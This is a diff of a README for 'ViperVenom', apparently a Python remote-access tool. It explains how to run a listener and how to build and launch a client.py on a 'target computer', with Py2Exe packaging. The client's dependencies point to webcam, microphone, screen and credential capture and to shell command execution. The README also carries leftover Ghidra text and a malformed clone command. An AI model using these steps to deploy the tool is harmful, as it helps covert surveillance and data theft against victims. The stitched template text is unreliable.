@@ -16,10 +16,9 @@ directory.
 Keep in mind, the tool is currently in beta, bugs may happen.
 
 ## Install Tool
-
 To create the latest tool for your platform from this source repository:
 
-##### Install Python Extensions:
+##### Install Python Extensions for vipervenom.py:
 * Socket
 * Time
 * platform
@@ -37,19 +36,45 @@ $ cd vipervenom-master
 **NOTE:** Instead of downloading the compressed source, you may instead want to clone the GitHub 
 repository:
 ```
-https://github.com/Revise7/ViperVenom.git
-cd ViperVenom
-pip3 install -r requirements.txt
-python3 vipervenom.py
+$ https://github.com/Revise7/ViperVenom.git
+$ cd ViperVenom
+$ pip3 install -r requirements.txt
+$ python3 vipervenom.py
 ```
 
 ##### ViperVenom's client.py file: 
 ```
-$ gradle buildGhidra
+$ gedit client.py
+$ pip3 install -r client_requirements.txt
 ```
-In order to connect computer to the listener(you, most likely)
+In order to connect computer to the listener(you, most likely) you need to edit a few things in the file
+and as well as installing a few Python extentions, for now. The client must have the lastest Python
+installation, and the Python extentions used in the client.py, but you can use the Py2Exe to create
+an executable.
 
-## Develop
+##### To connect your target computer:
+```
+$ Python3 client.py
+```
+
+##### Install Python Extention for client.py:
+* pillow
+* vidstream
+* socket
+* getpass
+* smtplib
+* base64
+* os
+* platform
+* sounddevice
+* scipy
+* time
+* subprocess
+* cv2
+* numpy
+* pyaudiogui
+
+##### Special Commands
 
 ### User Scripts and Extensions
 Ghidra installations support users writing custom scripts and extensions via the *GhidraDev* plugin 
